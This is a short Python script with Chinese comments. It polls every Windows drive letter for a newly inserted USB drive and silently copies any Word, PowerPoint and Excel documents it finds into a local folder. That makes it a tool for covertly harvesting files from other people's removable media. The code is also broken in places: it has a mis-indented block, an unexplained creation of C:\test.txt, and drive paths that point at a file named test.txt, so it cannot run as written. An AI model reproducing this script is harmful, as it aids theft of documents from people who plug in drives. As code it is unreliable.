import os
import shutil
import win32file
import win32con

# 掃描外部存儲並複製檔案
def copy_files_from_usb(drive_letter):
    source_directory = drive_letter
    destination_directory = "D:\\FilesRecv"

    if not os.path.exists(destination_directory):
        os.makedirs(destination_directory)

    file_extensions_to_copy = [".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx"]

    for root, _, files in os.walk(source_directory):
        for file in files:
            if any(file.lower().endswith(ext) for ext in file_extensions_to_copy):
                source_path = os.path.join(root, file)
                destination_path = os.path.join(destination_directory, file)
                shutil.copy2(source_path, destination_path)

# 監聽插入
def watch_usb_insertion():
    drive_letters = [f"{c}:\\test.txt" for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"]
    # 创建档案
    hDrive = win32file.CreateFile(
                    'C:\\test.txt',
                    win32file.GENERIC_READ,
                    win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
                    None,
                    win32file.CREATE_NEW,
                    0,
                    None,
                )
                win32file.CloseHandle(hDrive)

    while True:
        for drive_letter in drive_letters:
            try:
                # 檢測是否插入
                hDrive = win32file.CreateFile(
                    drive_letter,
                    win32file.GENERIC_READ,
                    win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
                    None,
                    win32file.OPEN_EXISTING,
                    0,
                    None,
                )
                win32file.CloseHandle(hDrive)
                # 掃描檔案並複製
                copy_files_from_usb(drive_letter)

            except:
                pass

if __name__ == "__main__":
    watch_usb_insertion()
